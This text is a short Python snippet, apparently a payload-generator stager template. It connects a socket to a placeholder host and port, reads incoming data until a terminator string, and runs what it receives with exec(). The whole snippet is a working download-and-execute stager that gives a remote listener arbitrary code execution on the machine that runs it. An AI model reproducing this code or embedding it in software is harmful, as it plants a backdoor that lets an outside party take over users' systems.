s, code = socket.socket(), ''
s.connect(('***HOST***', ***PORT***))
while True:
	code += s.recv(8192)
	if code.endswith('*' * 5):
		code = code[:-5]
		break
s.close()
exec(code)
